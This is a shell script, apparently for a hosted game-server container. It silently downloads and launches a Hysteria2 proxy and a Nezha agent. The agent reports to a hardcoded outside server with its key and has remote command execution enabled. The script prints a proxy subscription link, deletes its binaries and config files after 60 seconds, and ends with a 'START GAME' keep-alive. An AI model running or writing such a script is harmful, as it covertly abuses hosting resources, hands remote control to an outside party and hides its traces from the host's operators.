#!/usr/bin/env sh

# ==================== VARIABLES ====================
export UUID=${UUID:-'faacf142-dee8-48c2-8558-641123eb939c'}
export PASSWORD="$UUID"
export NEZHA_SERVER=${NEZHA_SERVER:-'nezha.mingfei1981.eu.org'}
export NEZHA_PORT=${NEZHA_PORT:-'443'}
export NEZHA_KEY=${NEZHA_KEY:-'pdsioixxZbwpxy5hk2'}
export NAME=${NAME:-'MJJ'}

# Custom HY2 port
export HY_PORT=${HY_PORT:-'6513'}

# ==================== DOWNLOAD FUNCTION (silent) ====================
download_file() {
local url="$1"
local filename="$2"
if curl -sL --fail "$url" -o "$filename"; then
true
else
exit 1
fi
}

# ==================== ARCH DETECTION & DOWNLOAD ====================
ARCH=$(uname -m)
if [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
download_file "https://github.com/apernet/hysteria/releases/download/app%2Fv2.6.5/hysteria-linux-arm64" "icchy"
sleep 5
download_file "https://github.com/babama1001980/good/releases/download/npc/arm64agent" "iccagent"
elif [[ "$ARCH" == "x86_64" || "$ARCH" == "amd64" ]]; then
download_file "https://github.com/apernet/hysteria/releases/download/app%2Fv2.6.5/hysteria-linux-amd64" "icchy"
sleep 5
download_file "https://github.com/babama1001980/good/releases/download/npc/amd64agent" "iccagent"
else
exit 1
fi

chmod +x "icchy" "iccagent" 2>/dev/null

# ==================== GENERATE HY CERTIFICATES ====================
openssl ecparam -name prime256v1 -genkey -noout -out server.key >/dev/null 2>&1
openssl req -new -x509 -key server.key -out server.crt -subj "/CN=www.bing.com" -days 36500 >/dev/null 2>&1

# ==================== HYSTERIA2 CONFIG ====================
cat > hy_config.json << EOF
{
  "listen": ":$HY_PORT",
  "tls": {
    "cert": "server.crt",
    "key": "server.key"
  },
  "auth": {
    "type": "password",
    "password": "$PASSWORD"
  },
  "quic": {
    "maxIdleTimeout": "30s",
    "disablePathMTUDiscovery": false
  },
  "udpIdleTimeout": "60s",
  "disableUDP": false,
  "ignoreClientBandwidth": false
}
EOF

# ==================== START SERVICES (silent) ====================
nohup ./"icchy" server -c hy_config.json > /dev/null 2>&1 &

tlsPorts=("443" "8443" "2096" "2087" "2083" "2053")
if [[ " ${tlsPorts[*]} " =~ " ${NEZHA_PORT} " ]]; then
NEZHA_TLS="--tls"
else
NEZHA_TLS=""
fi

if [[ -n "$NEZHA_SERVER" && -n "$NEZHA_KEY" ]]; then
if [[ -n "$NEZHA_PORT" ]]; then
nohup ./"iccagent" -s "${NEZHA_SERVER}:${NEZHA_PORT}" -p "${NEZHA_KEY}" ${NEZHA_TLS} > /dev/null 2>&1 &
else
cat > nezha.yaml << EOF
client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
report_delay: 1
server: ${NEZHA_SERVER}
skip_connection_count: false
skip_procs_count: false
temperature: false
tls: $( [[ " ${tlsPorts[*]} " =~ " ${NEZHA_SERVER##*:} " ]] && echo true || echo false )
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${UUID}
EOF
nohup ./"iccagent" -c nezha.yaml > /dev/null 2>&1 &
fi
fi

# ==================== GET PUBLIC INFO (silent) ====================
sleep 15
HOST_IP=$(curl -s ipv4.ip.sb || curl -s ipv6.ip.sb)
ISP=$(curl -s https://speed.cloudflare.com/meta | awk -F\" '{print $26"-"$18}' | sed 's/ /_/g')

# ==================== GENERATE SUBSCRIPTION (silent) ====================
cat > sub.txt << EOF
start install success

=== HY2 ===
hysteria2://$PASSWORD@$HOST_IP:$HY_PORT/?insecure=1&sni=www.bing.com#$NAME-HY-$ISP
EOF

base64 -w0 sub.txt > sub_base64.txt

# ==================== AUTO CLEANUP AFTER 60 SECONDS (in background) ====================

(
sleep 60
rm -rf icchy iccagent server.key server.crt hy_config.json nezha.yaml sub.txt sub_base64.txt core core.*
) &

# ==================== START GAME (KEEP ALIVE) ====================

tail -f /dev/null
